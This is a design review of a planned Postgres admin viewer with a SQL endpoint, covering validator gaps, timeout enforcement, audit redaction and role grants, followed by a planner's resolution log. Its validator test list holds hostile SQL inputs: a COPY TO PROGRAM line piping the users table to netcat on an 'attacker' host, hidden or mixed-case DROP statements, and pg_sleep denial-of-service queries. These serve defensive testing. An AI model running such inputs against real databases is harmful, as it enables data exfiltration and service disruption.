# Critic Round 1 — 013-postgres-viewer

**Reviewer angle**: cross-file consistency + requirement coverage
**Reviewed files**: spec.md, research.md, plan.md, data-model.md, contracts/pg-viewer-api.yaml, tasks.md, quickstart.md
**Date**: 2026-04-20

## Verdict: CONDITIONAL_YES

Spec bundle is mostly coherent and defense-in-depth is strong at the role layer. But there are real **contract-vs-tasks drift**, **SQL-validator edge-case gaps**, and one **audit PII hazard** that must be fixed before T-016/T-022 kick off. No BLOCK-level architectural flaws; 4 Critical items all have clear fix directions.

- CRITICAL: 4
- HIGH: 7
- MEDIUM: 8
- LOW / NITS: 6

## Resolution (appended by planner after round-1 review, 2026-04-20)

All decisions fixed by user in the round-2 prompt. Mapping of findings → resolution:

### CRITICAL (4/4 ADDRESSED)
- **C-1 psycopg v3 vs v2**: ADDRESSED. `psycopg[binary]>=3.1` added to tech stack (plan.md:12, research.md D-3, tasks.md T-002). Bridge rule documented: psycopg only for `Identifier.as_string(conn)`; asyncpg is sole driver; Composed must NEVER be passed to asyncpg. See research.md D-3 + plan.md "Backend Architecture" comment on query_builder.py + tasks.md T-012 acceptance.
- **C-2 auto-LIMIT subquery bug**: ADDRESSED via **wrap** decision. All validated SQL is ALWAYS wrapped `SELECT * FROM ({user_sql}) _limited LIMIT 1000`. See spec.md FR-014 step 6, research.md §"SQL Static Analysis Library" step 6, tasks.md T-016 acceptance ("LIMIT logic"), contracts yaml POST /sql description, quickstart.md §5b.
- **C-3 statement_timeout under asyncpg/SQLAlchemy**: ADDRESSED via **three layers**: (a) `ALTER ROLE aikm_viewer SET statement_timeout='10s'` in migration 001; (b) asyncpg `command_timeout=10`; (c) per-tx `SET LOCAL` inside `engine.begin()`. See spec.md FR-012, research.md D-4, plan.md Security-Layer L4, tasks.md T-010 acceptance (elevated to integration test).
- **C-4 raw_sql audit PII**: ADDRESSED via `redact_sql_for_audit()` util (new T-014.5) applied BEFORE INSERT. Patterns cover bearer tokens, `ghp_*`, `sk-*`, `sk-ant-*`, 20+ char hex, quoted literals near sensitive-column refs. See spec.md FR-017a, data-model.md §3 (redactor source), tasks.md T-014.5 + T-014 acceptance.

### HIGH (7/7 ADDRESSED)
- **H-1 `/audit` endpoint missing task**: ADDRESSED. T-020 scope now explicitly lists 6 endpoints including `GET /audit`; Pydantic `AuditEntry` added via T-030 scope extension (new `backend/app/schemas/pg_viewer.py`).
- **H-2 Pydantic models missing**: ADDRESSED. T-030 scope widened to create `backend/app/schemas/pg_viewer.py` with 9 Pydantic models matching OpenAPI components 1:1; CI diff test added.
- **H-3 validator test matrix**: ADDRESSED. T-016 acceptance expanded to 30+ cases (nested comments, MySQL hint, mixed-case, BOM, NFC, Cyrillic, UNION, pg_sleep, lo_import, COPY TO PROGRAM, `\copy` meta, quoted-string containing keyword).
- **H-4 408 vs 422 vs 500 mapping**: ADDRESSED. SQLSTATE→HTTP map formalised in spec FR-064 + tasks T-014.5 + T-020 acceptance.
- **H-5 clamp vs reject for LIMIT > 1000**: ADDRESSED. Decision = **REJECT 400** (not clamp). Aligned across spec.md FR-013, tasks.md T-016, contracts yaml /sql 400 description, quickstart.md §5b example.
- **H-6 REVOKE CREATE via PUBLIC**: ADDRESSED. Migration 001 now includes `REVOKE CREATE ON SCHEMA public FROM PUBLIC` for PG 14 safety. See data-model.md §4a step 8.
- **H-7 audit write in aikm tx rollback**: ADDRESSED. T-014 acceptance now mandates INDEPENDENT transaction (new session/connection committed before returning outer response). See tasks.md T-014.

### MEDIUM (8/8 ADDRESSED or ACCEPTED)
- **M-1 task count off by one**: ADDRESSED. Total now **30 tasks** (was 23+ with gaps). Recounted in tasks.md "Parallel-safe Task Count".
- **M-2 T-015 not on critical path**: ADDRESSED. Removed T-015 from critical path; documented as leaf.
- **M-3 T-011 blocks T-012**: ADDRESSED. T-011 `[P]` tag removed; T-012 scope explicitly depends on `resolve_identifier`.
- **M-4 composite PK**: ADDRESSED. T-011 acceptance now returns ordered `primary_key: list[str]`; T-012 emits multi-column default ORDER BY.
- **M-5 fake CSV comment row**: ADDRESSED. spec.md US4 acceptance #2 and T-015 acceptance removed the `-- truncated` comment row; replaced with `X-Truncated: true` header. Contracts yaml updated.
- **M-6 order_dir NULL**: verified consistent; no change.
- **M-7 asyncpg command_timeout in T-020**: ADDRESSED via C-3 fix (three-layer); T-020 acceptance references it.
- **M-8 quickstart trailing `;` positive example**: ADDRESSED in quickstart.md §5b.

### LOW / NITS
- L-1..L-6: mostly documented; `\copy` dropped from keyword denylist (post-critic M3 ops). L-5 HIDDEN_COLUMNS concretization wired into T-013 acceptance (schema scan on first import — CI-gated).

### User-story coverage gaps
- Playwright E2E for US1-AS1 (tables list): filed under T-037 scope expansion — frontend E2E now covers US1/US3/US4.
- US1-AS3 keyset pagination: ACCEPTED DEFERRED to v1.1 per research.md D-6.
- US1-AS4 JWT expired test: ADDRESSED in T-041 PoC #3 + T-020 acceptance.

### Out-of-scope observations (from §137)
- Pool sizing 5 → 10 (pool_size=3, max_overflow=7): ADDRESSED (post-critic H2 ops).
- Rate limiting: ADDRESSED as new FR-063 + T-014.6 rate limiter.
- Sensitive-column discovery CI: ADDRESSED via T-013 acceptance (schema-scan test wired to CI).


---

## CRITICAL (blocks implementation)

- [ ] **C-1 — `psycopg` vs `psycopg2` version confusion, plan references a name that does not exist in the project.**
  - Files: `plan.md:78` ("returns psycopg.sql.Composed"), `research.md:104-107` ("Quotes via psycopg.sql.Identifier"), `plan.md:12` ("SQLAlchemy async + asyncpg"), `backend/requirements.txt` has `psycopg2-binary>=2.9.0` and `asyncpg>=0.29.0` but NO `psycopg` (v3).
  - What's wrong: identifier-quoting plan uses `psycopg.sql.Identifier`. With v2 the module path is `psycopg2.sql.Identifier`; with v3 it's `psycopg.sql.Identifier`. These are not interchangeable. Additionally, if queries actually run via `asyncpg` engine (PG_VIEWER_DATABASE_URL = `postgresql+asyncpg://…`), `asyncpg` does not support `psycopg2.sql.Composed` objects at all — you must hand it a plain string + positional params.
  - Consequence: T-012 query builder will either fail to import or silently fall back to string formatting → SQL injection via identifier.
  - Fix direction: pick one. Either (a) add `psycopg[binary]>=3.1` to requirements and use `psycopg.sql.Identifier(...).as_string(conn)` to pre-render quoted identifiers into a plain string passed to asyncpg, or (b) drop psycopg entirely and write a strict `QUOTE_IDENT` helper using the already-validated `information_schema` whitelist + `"` + `.replace('"', '""')`. Document the decision in research.md D-3 before T-012 starts.

- [ ] **C-2 — Auto-LIMIT injection algorithm is underspecified and sqlparse's token-flat LIMIT detection cannot distinguish outer LIMIT from subquery LIMIT.**
  - Files: `spec.md:136` (FR-014.7: "if the outermost statement has no LIMIT clause"), `research.md:177` ("If no `LIMIT` clause at top level, append ` LIMIT 1000`"), `tasks.md:129` (T-016 acceptance: "auto-appends `LIMIT 1000` when absent").
  - What's wrong: plan asserts "outermost" / "top level" but doesn't say how to detect it. `sqlparse` returns a flat token stream; a `LIMIT` keyword inside a subquery (e.g. `SELECT * FROM (SELECT x FROM t LIMIT 5) s`) will be detected by naive `for token in stmt.flatten(): if token.value.upper()=='LIMIT'`. Result: outer query has no LIMIT, server believes one is present, returns up to ~infinite rows → OOM + bypasses FR-013.
  - Consequence: any user query with inner LIMIT but no outer LIMIT escapes the 1,000-row cap. Pair with no `SET statement_timeout` bypass and the connection pool starves.
  - Fix direction: either (a) always append `LIMIT 1000` by wrapping: `SELECT * FROM ({user_sql}) _wrap LIMIT 1000` (cheapest, handles ORDER BY ambiguity), or (b) detect LIMIT only at the end of the top-level token stream (walk `stmt.tokens` — NOT `flatten()` — and look at the last non-whitespace non-semicolon token group; LIMIT is a `sqlparse.sql.Where`-sibling at top level). Option (a) is strictly safer and simpler; spec the wrap approach.

- [ ] **C-3 — `statement_timeout` enforcement under asyncpg + SQLAlchemy is not verified; `SET LOCAL` semantics differ between driver paths.**
  - Files: `plan.md:60` ("`SET LOCAL statement_timeout = '10s'`"), `research.md:111-115` (shows `async with engine.begin() as conn: await conn.execute(text("SET LOCAL statement_timeout = '10s'"))`), `spec.md:127` (FR-012).
  - What's wrong: `SET LOCAL` only takes effect inside an explicit transaction. With SQLAlchemy's async engine over asyncpg, `engine.begin()` does begin a tx so this is fine — BUT if any code path uses `engine.connect()` or `async_session.execute(...)` without `begin()`, `SET LOCAL` is a no-op and pg_sleep(30) will complete. Also, asyncpg has its own `command_timeout` on the connection which is more reliable; mixing `SET LOCAL` + SQLAlchemy on asyncpg has a known quirk where autocommit-mode connections silently drop the setting.
  - Consequence: FR-012 and spec.md §US5 acceptance #5 (timeout → 408) may not fire; `pg_sleep(30)` could hang the event loop for 30s, chaining into connection-pool exhaustion (pool_size=2 means two such queries take down the viewer).
  - Fix direction: in T-010/T-020, enforce both layers: (a) use SQLAlchemy `AsyncSession.begin()` context for every viewer query (or `engine.begin()`), and (b) set asyncpg `command_timeout=10` when constructing the engine (`create_async_engine(url, connect_args={'command_timeout': 10})`). Add a test in T-041 that `SELECT pg_sleep(30)` wall-clock returns < 11s, not 30s.

- [ ] **C-4 — `raw_sql` audit column is unredacted PII/secret hazard.**
  - Files: `data-model.md:27` (`raw_sql TEXT ... NULL for browse/schema rows`), `spec.md:138` (FR-016: "`raw_sql` = the submitted SQL (truncated to 8,000 chars)"), `tasks.md:162` (T-022 acceptance: "`raw_sql` written to audit log truncated").
  - What's wrong: admin can paste `SELECT 'ghp_AAA...actual_PAT' AS tok FROM users` or `SELECT * FROM users WHERE password_hash = 'bcrypt$...'` and the literal text goes to `pg_viewer_audit_log.raw_sql` verbatim. The audit table is read by **any admin** via `GET /api/pg-viewer/audit` (line 204 of contract). That means admin A's pasted secret is disclosed to admin B. Also `password_hash` values in WHERE clauses leak the very column we redact in response bodies — breaking FR-060/FR-061.
  - Consequence: audit feature re-introduces the exact disclosure the redaction layer prevents. Violates FR-061 ("Redaction MUST be enforced in the backend response builder").
  - Fix direction: (a) run a light regex scrubber on `raw_sql` before insert — substitute `'[^']{8,}'` string literals with `'<REDACTED>'` and substitute `\d{10,}` number literals with `<NUM>` when adjacent to `password|secret|token|api_key|hash` column references, OR (b) do not return `raw_sql` from `/audit` endpoint at all (requires direct DB query by a separate super-admin to inspect), OR (c) store a hash of raw_sql + store only the first 200 chars. At minimum, document this in spec and add the regex scrub as part of T-014.

---

## HIGH (should fix before implementation)

- [ ] **H-1 — Contract defines `GET /pg-viewer/audit` but tasks only reference audit-writing, not audit-reading endpoint.**
  - Files: `contracts/pg-viewer-api.yaml:204-234` (defines endpoint + `AuditEntry` schema), `spec.md:161` (FR-051: "reuse `/admin` query-audit tab or add a sub-tab"), `tasks.md` — T-020 lists "6 endpoints (list / schema / rows / export / audit / sql)" but no task explicitly implements the GET /audit handler or its Pydantic response model. T-035 is frontend-only.
  - Fix direction: add explicit subtask to T-020 (or spin out T-023) that implements `GET /pg-viewer/audit` with query filters, Pydantic `AuditEntry` model mirroring the contract, pagination, role check. Also decide the PII question from C-4 here.

- [ ] **H-2 — No task creates Pydantic models for any of the OpenAPI schemas.**
  - Files: `contracts/pg-viewer-api.yaml:254-382` defines `TableSummary`, `TableSchema`, `Column`, `Index`, `ForeignKey`, `RowPage`, `SqlResult`, `AuditEntry`, `Error`. `tasks.md` T-011 returns "pydantic models" without listing which; T-012/T-015/T-020/T-022 never name the classes.
  - Consequence: likely to diverge — engineers hand-roll dict responses; contract drifts.
  - Fix direction: add a T-009 (or extend T-010) "Pydantic schema models in `backend/app/schemas/pg_viewer.py` 1-to-1 with OpenAPI component schemas", dispatched to fullstack-engineer, acceptance = `pytest` diff check vs yaml.

- [ ] **H-3 — SQL validator test matrix misses several documented bypass vectors.**
  - Files: `tasks.md:121-131` (T-016 acceptance), `plan.md:145` (risk row mentions "UNION, stacked statements with tab/newline, comment-embedded keywords, CTE-headed DELETE, unicode escape").
  - Missing from T-016 acceptance tests:
    1. `UNION` + subquery with DML in subquery: `SELECT 1 UNION SELECT (DELETE FROM users RETURNING 1)` — in Postgres 14+ `DELETE` is not valid inside an expression, but a subquery `FROM` using a writable CTE variant should be tested.
    2. `SELECT` with C-style comment hiding keyword: `SELECT 1 /*! DROP */ FROM users` (MySQL hint comment ignored by PG, but sqlparse may tokenize oddly).
    3. Nested comment: `/* /* */ DROP */ SELECT 1`.
    4. `pg_sleep(30)` DoS detection pre-DB — spec relies on statement_timeout only; should a denylist of `pg_sleep`, `pg_terminate_backend`, `pg_cancel_backend` be added? Currently the timeout is the only defense; if C-3 bug exists, pg_sleep slips through.
    5. `COPY (SELECT * FROM users) TO PROGRAM 'nc attacker 4444'` — COPY is in denylist, good, but verify `\copy` variant.
    6. Mixed-case: `DrOp tAbLe users` — spec says case-insensitive but not tested.
    7. Backtick/quoted identifier: `SELECT 1 FROM "users"` — accepted; `SELECT * FROM "users"; "DROP TABLE users"` — test that quoted-string `DROP` inside a value is NOT flagged.
  - Fix direction: expand T-016 test matrix to include the 7 above; make #4 a design decision (denylist pg_sleep?).

- [ ] **H-4 — Contract does not specify error schema for `SqlResult` path 429 / 413, and 408 vs 422 semantics overlap.**
  - Files: `contracts/pg-viewer-api.yaml:192-201`. 408 is "Statement timeout" and 422 is "Execution error from Postgres"; a timeout raised by Postgres manifests as `QueryCanceledError` / `canceling statement due to statement timeout` — should return 408 per spec, but a naive `try: ... except Exception:` dispatch will route it to 422. Also no 413 for oversize SQL (spec says 400 `input exceeds max length`, consistent, but contract's requestBody maxLength=8000 uses 400 not 413, consistent — OK).
  - Fix direction: document error-mapping table in plan.md: `QueryCanceledError` → 408, `UndefinedTable`/`UndefinedColumn` → 422, anything else DB → 500 (sanitized). Add to T-022 acceptance.

- [ ] **H-5 — Auto-LIMIT "user requested > 1000 → reject" vs "clamp" inconsistency.**
  - Files: `spec.md:128` (FR-013 "cap every query at `LIMIT {row_limit}` ... injected server-side even if the user requests more" — clamp), `tasks.md:129` (T-016: "if user supplied LIMIT > 1000, validator rewrites / rejects — **decide at implementation**: reject with 400"), `contracts/pg-viewer-api.yaml:186` ("`row limit exceeded (server-side cap 1000)` (shouldn't reach user — server auto-injects LIMIT, but surfaced if user attempts LIMIT > 1000)").
  - What's wrong: three files disagree. Spec says clamp, tasks defer + tentatively reject, contract says reject.
  - Fix direction: pick one. Recommend **clamp + notice** ("notice: LIMIT clamped from 5000 to 1000") — matches FR-013 literal text and is friendlier UX. Update tasks.md T-016 and the OpenAPI description to match.

- [ ] **H-6 — Migration `REVOKE CREATE ON SCHEMA public` may be rejected on Postgres 15+ where that privilege is already not granted to `public` by default.**
  - Files: `data-model.md:86`, `research.md:86`, migration SQL in data-model.md §4.
  - What's wrong: `REVOKE CREATE ON SCHEMA public FROM aikm_viewer` is fine (revoking from the role), but `GRANT CONNECT, TEMPORARY ON DATABASE aikm` then immediately `REVOKE TEMPORARY` is wasted cycles. More critically, the migration does not `REVOKE ALL ON SCHEMA public FROM PUBLIC` — meaning if default ACLs grant something to PUBLIC role, aikm_viewer inherits it. PG 15 changed this default; PG 14 (which the project's 16-alpine is newer than) grants CREATE to PUBLIC by default on the `public` schema.
  - Consequence: depending on PG version, `aikm_viewer` may inherit CREATE via PUBLIC and the verification query in data-model.md:89 will flag it. The test `has_schema_privilege('aikm_viewer', 'public', 'CREATE')` will correctly fail closed, blocking deploy — but not until T-003 runs.
  - Fix direction: add `REVOKE CREATE ON SCHEMA public FROM PUBLIC;` in the migration before granting to aikm_viewer, OR explicitly verify the role is not a member of PUBLIC (it always is — PUBLIC is an implicit group), so must do the revoke. Also simplify: drop the CONNECT/TEMPORARY dance, just `GRANT CONNECT ON DATABASE aikm TO aikm_viewer`.

- [ ] **H-7 — `pg_viewer_audit_log` write is via the main `aikm` session (T-014 line 96) but fails to audit if the main session's tx is rolled back by the upstream handler.**
  - Files: `tasks.md:96` ("using the **main** `aikm` session"), `spec.md:160` (FR-050 "write one row ... for every browse, schema inspect, filter, and export").
  - What's wrong: if the route handler raises after partial work, FastAPI's session dep rolls back the aikm tx → audit insert disappears. Then the user saw a failure but we have no record.
  - Fix direction: audit writes must be in an **independent** transaction (new connection OR `session.begin_nested` with commit before returning the HTTP error). Specify in T-014 acceptance: "audit row is committed in its own transaction, independent of any outer tx rollback."

---

## MEDIUM (fix during implementation)

- [ ] **M-1 — Task numbering has gaps but spec says "23 tasks".** `tasks.md:364` claims 23 total. Actual IDs: T-001, T-002, T-003, T-010, T-011, T-012, T-013, T-014, T-015, T-016, T-020, T-021, T-022, T-030, T-031, T-032, T-033, T-034, T-035, T-036, T-037, T-040, T-041, T-042 = **24 tasks**. Count is off by one. Fix: recount and update line 364 or remove one task.

- [ ] **M-2 — Task dependency graph has T-015 on the "critical path" but T-015 (CSV exporter) is orthogonal to T-016 (SQL validator); they can run fully in parallel.** `tasks.md:353` says "Critical path: T-001/002/003 → T-010 → T-015 → T-016". T-015 does not block T-016. Fix: drop T-015 from critical path, it's a leaf.

- [ ] **M-3 — T-011 (introspection) should be blocking for T-012 (query builder) because T-012 needs `resolve_identifier`.** Graph line 337 shows them as parallel siblings after T-010. Fix: either inline identifier-resolution into T-012 or mark T-012 depends on T-011 (drop `[P]`).

- [ ] **M-4 — FR-023 says default ORDER BY is primary key DESC, FR-024 says validate against information_schema columns — but no task explicitly validates that the composite PK case is handled.** Tables like `user_permissions` may have composite PK. Fix: add to T-011 acceptance: "returns ordered list of PK columns; query_builder emits `ORDER BY pk_col1 DESC, pk_col2 DESC`".

- [ ] **M-5 — US4 acceptance #2 says "CSV contains first 1,000 rows with a trailing comment row `-- truncated at row-limit 1000`" — but CSV has no comment syntax; a `--` line will be parsed as a data row by any reader.** `spec.md:75`. Fix: change to a header hint row OR a response header `X-Truncated: true` + UI toast (spec already says UI toast). Remove the fake "comment row" from the CSV body.

- [ ] **M-6 — `order_dir` enum in data-model.md is `ASC/DESC` NOT NULL with default NULL** — contradiction. `data-model.md:31` (NULLable YES) vs `data-model.md:145` migration `CHECK (order_dir IN ('ASC','DESC') OR order_dir IS NULL)` — consistent, but column definition on line 31 says NULL default. Just confirm. Actually OK.

- [ ] **M-7 — `T-020` acceptance says "Statement timeout enforced (`SET LOCAL statement_timeout` at tx start) on both browse and sql paths"** but doesn't mandate the asyncpg `command_timeout` belt-and-suspenders from C-3. Wire the fix from C-3 into T-020 acceptance.

- [ ] **M-8 — Quickstart 5b curl for multi-statement uses `SELECT 1; SELECT 2;` (trailing `;`)** — spec says single trailing `;` is tolerated (research.md:174). So this example should actually be rejected (two statements), which matches the comment. OK — verified clean, but add a positive example showing single trailing `;` accepted: `curl ... -d '{"sql":"SELECT 1;"}' # 200`.

---

## LOW / NITS

- [ ] **L-1 — `spec.md:134` (FR-014.5)** lists forbidden set including `SECURITY` and `\copy` but `\copy` is a psql meta-command, not valid SQL — sqlparse will not emit a keyword token for it. Not wrong to list, just dead weight. OK.
- [ ] **L-2 — `contracts/pg-viewer-api.yaml:10` Production server URL is hardcoded `http://192.168.1.11:8000`** — fine for this internal project, but noting for any future OpenAPI client generation.
- [ ] **L-3 — `tasks.md:256` "Monaco NOT introduced"** is a good constraint, but note: plain `<TextArea>` loses line numbers; Carbon has `CodeSnippet` for display-only. Fine for v1.
- [ ] **L-4 — `research.md:177` auto-LIMIT says "append ` LIMIT 1000`"** — if the user's SELECT ends with `FOR UPDATE` / `FOR SHARE` (not allowed on RO role but lexically valid in sqlparse), appending `LIMIT 1000` AFTER `FOR UPDATE` is syntactically wrong. Since `FOR UPDATE` would be rejected by role anyway (RO), low risk, but the wrap approach (C-2 fix) avoids this cleanly.
- [ ] **L-5 — `data-model.md:110` hints at `auth_tokens.token` "hypothetical — review at review-time"** — should be concrete by the time T-013 writes the redaction module. Add a task line in T-013 acceptance: "scan actual schema on deploy host, concretize HIDDEN_COLUMNS list."
- [ ] **L-6 — `quickstart.md:208` attack test uses `psql -U aikm_viewer` without password** — will prompt interactively. Add `PGPASSWORD=$PG_VIEWER_PASSWORD` or `-h postgres` + password-file for scripted PoC.

---

## User-story coverage matrix

| US | Acceptance bullet | Task(s) | E2E test |
|---|---|---|---|
| US1 | AS1 tables list | T-011, T-020, T-030, T-032 | T-037 indirectly; **no explicit Playwright for US1 AS1** — add to T-033 |
| US1 | AS2 first 50 rows | T-011, T-012, T-020, T-033 | T-033 acceptance |
| US1 | AS3 paginate keyset | T-012 | **NOT TESTED** — add test |
| US1 | AS4 JWT expired | T-020 | **NOT TESTED** — add to T-041 |
| US2 | schema tab | T-011, T-020, T-034 | T-034 |
| US3 | filter + sort | T-012, T-020, T-033 | T-033 |
| US4 | CSV export | T-015, T-020, T-033 | T-033 |
| US5 | all 7 bullets | T-016, T-022, T-036, T-037 | T-037 |

---

## Out-of-scope observations

- Connection pool pool_size=2 + max_overflow=3 = 5 connections total for viewer role (`research.md:96`). With 5 concurrent admins (plan.md:18 "Concurrent admins ≤ 5") and a 10s statement timeout, one stuck query pegs 20% of capacity. Consider pool_size=4, max_overflow=6.
- No rate limiting on `POST /sql`. An admin could accidentally run a bash loop hitting the endpoint. Minor, but consider per-user-per-minute budget in a v1.1.
- Sensitive-column redaction uses hardcoded tuple — adding a column named `secret_key` to a new table silently leaks until critic catches it. The "discovery test" in data-model.md:122 is great — ensure it runs in CI (tasks.md does not currently wire it into T-041 or any CI step). Add.
